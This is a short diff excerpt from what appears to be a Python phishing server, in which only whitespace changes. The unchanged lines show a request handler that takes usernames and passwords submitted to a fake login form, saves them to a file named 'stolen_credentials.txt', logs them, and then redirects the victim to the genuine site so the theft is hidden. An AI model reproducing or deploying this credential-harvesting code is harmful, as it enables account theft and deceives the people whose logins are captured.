@@ -6,13 +6,13 @@ class PhishingHandler(SimpleHTTPRequestHandler):
         """Capture credentials from the fake login form."""
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
-        
+
         # Log captured credentials
         with open("stolen_credentials.txt", "a") as f:
             f.write(post_data + "\n")
-        
+
         logging.info(f"Captured credentials: {post_data}")
-        
+
         # Redirect victim to the real website
         self.send_response(302)
         self.send_header('Location', 'https://real-login-page.com')
